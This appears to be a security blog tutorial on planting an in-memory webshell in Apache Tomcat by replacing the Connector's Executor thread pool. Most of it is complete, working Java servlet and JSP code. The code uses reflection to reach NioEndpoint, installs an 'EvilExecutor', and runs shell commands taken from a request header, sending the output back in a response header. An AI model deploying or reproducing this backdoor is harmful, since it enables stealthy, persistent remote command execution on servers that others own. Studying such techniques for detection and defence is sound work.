# Java Security Of Tomcat Executor

## Preparation

​ The traditional Web application-type memory horses I learned before were all based on Container. This article will learn about memory horse injection based on Connector.

​ The following figure shows the composition of `Connector`. `Connector` is mainly composed of `ProtocolHandler` and `Adapter`, and `ProtocolHandler` is mainly composed of `Endpoint` and `Processor`.

![](img/1.png)

​ `ProtocolHandler` is classified as follows:

![](img/2.png)

​ `Endpoint` is one of the components of `ProtocolHandler`, and `NioEndpoint` is an implementation in `Http11NioProtecl`. `Endpoint` five components:

- `LimitLatch`: Connecting to the controller, responsible for controlling the maximum number of connections. If this connection is exceeded, `Tomcat` will block this connection thread and wait until other connections are released before consuming this connection;
- `Acceptor`: Responsible for receiving a new connection and then returning a `Channel` object to `Poller`;
- Poller: It can be regarded as a `Selector` in `Nio`, responsible for monitoring the status of `Channel`;

- `SocketProcessor`: It can be regarded as an encapsulated task class;
- `Executor`: `Tomcat`'s own extended thread pool, used to execute task classes.

## Process Analysis

​ Follow up on the `Executor` component and follow up on where its `execute` method is implemented.

![](img/3.png)

Follow up on the `org.apache.catalina.core.StandardThreadExecutor#execute` method. When the `executor` is not `null`, it will call the `execute` method of `executor`.

![](img/4.png)

Follow up on the `org.apache.tomcat.util.threads.ThreadPoolExecutor#execute` method. Therefore, assuming that a malicious `Executor` inherits `ThreadPoolExecutor` can be created and override the `execute` method in it, then the malicious code will be able to be executed when the method is called.

![](img/5.png)

With the above idea, the focus now is on how to set the property `executor` to the created malicious `Executor`. Follow up on the `org.apache.tomcat.util.net.AbstractEndpoint#setExecutor` method, which can replace the original `Executor` with the created malicious `Executor`.

![](img/6.png)

Now that I know how to create a malicious `Executor` and how to modify the property `executor` to a malicious `Executor`, getting `Request` and `Response` has become the focus now. Here I use the tool [java-object-searcher](https://github.com/c0ny1/java-object-searcher) to get the `Request` object. The syntax of search is as follows:

```java
List<Keyword> keys = new ArrayList<>();
keys.add(new Keyword.Builder().setField_type("Response").build());
List<Blacklist> blacklists = new ArrayList<>();
blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
SearchRequestByBFS searcher = new SearchRequestByBFS(Thread.currentThread(),keys);
searcher.setBlacklists(blacklists);
searcher.setIs_debug(true);
searcher.setMax_search_depth(20);
searcher.setReport_save_path("/Users/alphag0/Desktop");
searcher.searchObject();
```

​ Use this tool to find an appReadBufHandler for `nioChannels` located in `NioEndpoint`, where the `Buffer` stores the required `request` (utilization point is not unique).

![](img/7.png)

​ Get the value of `Buffer` through layered reflections:

```java
TargetObject = {org.apache.tomcat.util.threads.TaskThread}
   ---> group = {java.lang.ThreadGroup}
    ---> threads = {class [Ljava.lang.Thread;}
     ---> [14] = {java.lang.Thread}
       ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
        ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
         ---> nioChannels = {org.apache.tomcat.util.collections.SynchronizedStack}
          ---> stack = {class [Ljava.lang.Object;}
           ---> [0] = {org.apache.tomcat.util.net.NioChannel}
            ---> appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer}
              ---> request = {org.apache.coyote.Request}
```

```java
package servlet;

import org.apache.coyote.http11.Http11InputBuffer;
import org.apache.tomcat.util.collections.SynchronizedStack;
import org.apache.tomcat.util.net.NioEndpoint;

import javax.servlet.ServletConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

@WebServlet(name = "ExecutorServlet", value = "/ExecutorServlet")
public class ExecutorServlet extends HelloServlet {
    @Override
    public void init(ServletConfig config) {
    };

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        try {
            Field field = ThreadGroup.class.getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(Thread.currentThread().getThreadGroup());
            for (Thread thread : threads) {
                if (!thread.getName().contains("exec") && thread.getName().contains("Acceptor")) {
                    Field field1 = Thread.class.getDeclaredField("target");
                    field1.setAccessible(true);
Object pollor = field1.get(thread);
                    Field field7 = pollor.getClass().getDeclaredField("endpoint");
                    field7.setAccessible(true);
                    NioEndpoint nioEndpoint1 = (NioEndpoint) field7.get(pollor);
                    Field field8 = nioEndpoint1.getClass().getDeclaredField("poller");
                    field8.setAccessible(true);
                    Object o = field8.get(nioEndpoint1);
                    Field field2 = o.getClass().getDeclaredField("this$0");
                    field2.setAccessible(true);
                    NioEndpoint nioEndpoint = (NioEndpoint) field2.get(o);
                    Field field3 = NioEndpoint.class.getDeclaredField("nioChannels");
                    field3.setAccessible(true);
                    SynchronizedStack synchronizedStack = (SynchronizedStack) field3.get(nioEndpoint);
                    Field field4 = SynchronizedStack.class.getDeclaredField("stack");
                    field4.setAccessible(true);
                    Object[] object = (Object[]) field4.get(synchronizedStack);
                    Field field5 = object[0].getClass().getDeclaredField("appReadBufHandler");
                    field5.setAccessible(true);
                    Http11InputBuffer appReadBufHandler = (Http11InputBuffer) field5.get(object[0]);
                    Field field6 = appReadBufHandler.getClass().getDeclaredField("byteBuffer");
                    field6.setAccessible(true);
                    ByteBuffer byteBuffer = (ByteBuffer) field6.get(appReadBufHandler);
                    String s = new String(byteBuffer.array(), "UTF-8");
                    System.out.println(s);
                }
            }
        } catch (NoSuchFieldException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    }
}
```

![](img/8.png)

​ Now the problem of receiving `Request` is solved, and next we will solve the problem of echo. You can still use the same method to search for Response objects. Here I use the breakpoint method to find the `Response` object that can be used. Here, I get the next breakpoint in the `Response` after the `Demo` of the `Request` object is completed, and then look for the `Response` object that can be used.

![](img/9.png)

​ Here, through layered reflection, add the echo of the command execution to the `header` of the obtained `Response` object.

```java
package servlet;

import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.Response;
import org.apache.coyote.http11.Http11InputBuffer;
import org.apache.tomcat.util.collections.SynchronizedStack;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.apache.tomcat.util.net.NioEndpoint;

import javax.servlet.ServletConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.ArrayList;

@WebServlet(name = "ExecutorServlet", value = "/ExecutorServlet")
public class ExecutorServlet extends HelloServlet {
    @Override
    public void init(ServletConfig config) {
    };

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        response.getWriter().write("Executor Inject Successfully...");
        try {
            Field field1 = ThreadGroup.class.getDeclaredField("threads");
            field1.setAccessible(true);
            Thread[] threads1 = (Thread[]) field1.get(Thread.currentThread().getThreadGroup());
            for (Thread thread : threads1) {
                if (!thread.getName().contains("exec") && thread.getName().contains("Poller")) {
                    Field field2 = thread.getClass().getDeclaredField("target");
                    field2.setAccessible(true);
                    Object target = field2.get(thread);
                    if (target instanceof Runnable) {
                        try {
                            Field field9 = target.getClass().getDeclaredField("this$0");
field9.setAccessible(true);
                            NioEndpoint nioEndpoint = (NioEndpoint) field9.get(target);
                            Field field4 = AbstractEndpoint.class.getDeclaredField("handler");
// Field field4 = AbstractProtocol.class.getDeclaredField("handler");
                            field4.setAccessible(true);
                            Object handler = field4.get(nioEndpoint);
                            Field field5 = handler.getClass().getDeclaredField("global");
                            field5.setAccessible(true);
                            RequestGroupInfo requestGroupInfo = (RequestGroupInfo) field5.get(handler);
                            Field field6 = requestGroupInfo.getClass().getDeclaredField("processors");
                            field6.setAccessible(true);
                            ArrayList arrayList = (ArrayList) field6.get(requestGroupInfo);
                            for (Object o : arrayList) {
                                Field field7 = o.getClass().getDeclaredField("req");
                                field7.setAccessible(true);
                                Request request1 = (Request) field7.get(o);
                                Field field8 = request1.getClass().getDeclaredField("response");
                                field8.setAccessible(true);
                                Response response1 = (Response) field8.get(request1);
                                response1.addHeader("Attack", new String("H3rmesk1t".getBytes(), "UTF-8"));
                                System.out.println(response1);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    }
}
```

![](img/10.png)

## Achievement

### Idea

​ The specific ideas for dynamic global replacement of `Executor` memory horse are as follows:

- First get the corresponding `NioEndpoint`;
- Get the corresponding `executor` property;
- Create a malicious `executor`;
- Pass in the malicious `executor`.

### Dynamic Registration

#### Servlet

```java
package servlet;

import org.apache.coyote.RequestInfo;
import org.apache.coyote.Response;
import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.tomcat.util.threads.ThreadPoolExecutor;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.*;

@WebServlet(name = "ExecutorMemoryShellServlet", value = "/ExecutorMemoryShellServlet")
public class ExecutorMemoryShellServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        super.doGet(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        NioEndpoint nioEndpoint = (NioEndpoint) getNioEndpoint();
        ThreadPoolExecutor executor = (ThreadPoolExecutor) nioEndpoint.getExecutor();
        nioEndpoint.setExecutor(new EvilExecutor(executor.getCorePoolSize(), executor.getMaximumPoolSize(),
                executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(),
                executor.getThreadFactory()));
        response.getWriter().write("Executor Inject Successfully...");
    }

    public Object getField(Object obj, String field) {
        Class clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
Field declaredField = clazz.getDeclaredField(field);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }

    public Object getNioEndpoint() {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            try {
                if (thread.getName().contains("Poller")) {
                    Object target = getField(thread, "target");
                    return getField(target, "this$0");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return new Object();
    }

    class EvilExecutor extends ThreadPoolExecutor {
        public EvilExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);
        }
        public String getRequest() {
            try {
                Object nioEndpoint = getNioEndpoint();
                Object[] objects = (Object[]) getField(getField(nioEndpoint, "nioChannels"), "stack");
                ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
                String req = new String(heapByteBuffer.array(), StandardCharsets.UTF_8);
                String cmd = req.substring(req.indexOf("set-reference") + "set-reference".length() + 1, req.indexOf("\r", req.indexOf("set-reference")) - 1);
                return cmd;
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

        public void getResponse(byte[] res) {
            try {
                Object nioEndpoint = getNioEndpoint();
                ArrayList processors = (ArrayList) getField(getField(getField(nioEndpoint, "handler"), "global"), "processors");
                for (Object processor: processors) {
                    RequestInfo requestInfo = (RequestInfo) processor;
                    Response response = (Response) getField(getField(requestInfo, "req"), "response");
                    response.addHeader("set-message", new String(res, StandardCharsets.UTF_8));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void execute(Runnable command) {
            String cmd = getRequest();
            try {
                if (cmd != null) {
                    boolean isLinux = true;
                    String osType = System.getProperty("os.name");
                    if (osType != null && osType.toLowerCase().contains("win")) {
                        isLinux = false;
                    }

                    String[] commands = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream inputStream = Runtime.getRuntime().exec(commands).getInputStream();
                    Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                    String output = scanner.hasNext() ? scanner.next() : "";
                    getResponse(output.getBytes());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }
    }
}
```

![](img/11.png)

### JSP

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
<%@ page import="java.util.concurrent.BlockingQueue" %>
<%@ page import="java.util.concurrent.Thre
adFactory" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.coyote.RequestInfo" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    public Object getField(Object obj, String field) {
        Class clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field declaredField = clazz.getDeclaredField(field);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }

    public Object getNioEndpoint() {
    Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
    for (Thread thread : threads) {
        try {
            if (thread.getName().contains("Poller")) {
                Object target = getField(thread, "target");
                return getField(target, "this$0");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
        return new Object();
    }

    class EvilExecutor extends ThreadPoolExecutor {
        public EvilExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);
        }

        public String getRequest() {
            try {
                Object nioEndpoint = getNioEndpoint();
                    Object[] objects = (Object[]) getField(getField(nioEndpoint, "nioChannels"), "stack");
                    ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
                    String req = new String(heapByteBuffer.array(), StandardCharsets.UTF_8);
                    String cmd = req.substring(req.indexOf("set-reference") + "set-reference".length() + 1, req.indexOf("\r", req.indexOf("set-reference")) - 1);
                    return cmd;
                } catch (Exception e) {
                    e.printStackTrace();
                return null;
            }
        }

        public void getResponse(byte[] res) {
            try {
                Object nioEndpoint = getNioEndpoint();
                    ArrayList processors = (ArrayList) getField(getField(getField(nioEndpoint, "handler"), "global"), "processors");
                for (Object processor: processors) {
                    RequestInfo requestInfo = (RequestInfo) processor;
                    Response response = (Response) getField(getField(requestInfo, "req"), "response");
                    response.addHeader("set-message", new String(res, StandardCharsets.UTF_8));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void execute(Runnable command) {
            String cmd = getRequest();
            try {
                if (cmd != null) {
                    boolean isLinux = true;
                    String osType = System.getProperty("os.name");
                    if (osType != null && osType.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] commands = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream inputStream = Runtime.getRuntime().exec(commands).getInputStream();
                    Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                    String output = scanner.hasNext() ? scanner.next() : "";
                    getResponse(output.getBytes());
                }
            } catch (Exception
e) {
                e.printStackTrace();
            }
            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }
    }
%>

<%
    NioEndpoint nioEndpoint = (NioEndpoint) getNioEndpoint();
    ThreadPoolExecutor executor = (ThreadPoolExecutor) nioEndpoint.getExecutor();
    nioEndpoint.setExecutor(new EvilExecutor(executor.getCorePoolSize(), executor.getMaximumPoolSize(),
            executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(),
            executor.getThreadFactory()));
    response.getWriter().write("Executor Inject Successfully...");
%>
```

![](img/12.png)